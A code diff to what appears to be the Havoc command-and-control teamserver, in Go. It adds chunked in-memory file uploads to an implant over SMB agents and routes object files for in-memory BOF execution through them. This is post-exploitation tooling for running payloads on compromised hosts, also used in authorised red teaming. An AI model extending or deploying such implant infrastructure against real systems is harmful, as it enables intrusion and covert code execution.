@@ -27,6 +27,40 @@ import (
 	"github.com/olekukonko/tablewriter"
 )
 
+// we upload heavy files to the implant in chunks, so SMB agents can handle the size
+func (a *Agent) UploadMemFileInChunks(FileData []byte) uint32 {
+	var ID uint32
+	var chunkSize = DEMON_MAX_RESPONSE_LENGTH
+
+	// generate a random ID
+	ID = rand.Uint32()
+
+	FileSize := len(FileData)
+	// split the file in chunks of DEMON_MAX_RESPONSE_LENGTH
+	for start := 0; start < FileSize; start += chunkSize {
+		end := start + chunkSize
+
+		// necessary check to avoid slicing beyond FileData capacity
+		if end > FileSize {
+			end = FileSize
+		}
+
+		MemFileJob := Job{
+			RequestID: rand.Uint32(),
+			Command: COMMAND_MEM_FILE,
+			Data: []any{
+				ID,
+				uint64(FileSize),
+				FileData[start:end],
+			},
+		}
+
+		a.AddJobToQueue(MemFileJob)
+	}
+
+	return ID
+}
+
 func (a *Agent) TeamserverTaskPrepare(Command string, Console func(AgentID string, Message map[string]string)) error {
 
 	var Commands = strings.Split(Command, "::")
@@ -507,6 +541,7 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 			ObjectFile   []byte
 			Parameters   []byte
 			Flags        uint32
+			MemFileId    uint32
 			ok           bool
 		)
 
@@ -539,6 +574,8 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 			}
 		}
 
+		MemFileId = a.UploadMemFileInChunks(ObjectFile)
+
 		if FunctionName, ok = Optional["FunctionName"].(string); !ok {
 			return nil, errors.New("CoffeeLdr: FunctionName not defined")
 		}
@@ -568,7 +605,7 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 
 		job.Data = []interface{}{
 			FunctionName,
-			ObjectFile,
+			MemFileId,
 			Parameters,
 			Flags,
 		}
@@ -5995,6 +6032,22 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
+
+	case COMMAND_MEM_FILE:
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
+			var (
+				MemFileID = Parser.ParseInt32()
+				Success   = Parser.ParseInt32()
+			)
+
+			// TODO: don't ignore this packet?
+			//       if this fails, then inline-execute, dotnet, or upload will show the error
+
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_MEM_FILE, Success: %d, MemFileID: %x", AgentID, Success, MemFileID))
+			a.RequestCompleted(RequestID)
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_MEM_FILE, Invalid packet", AgentID))
+		}
 
 	default:
 		logger.Debug(fmt.Sprintf("Agent: %x, Command: UNKNOWN (%d))", AgentID, CommandID))
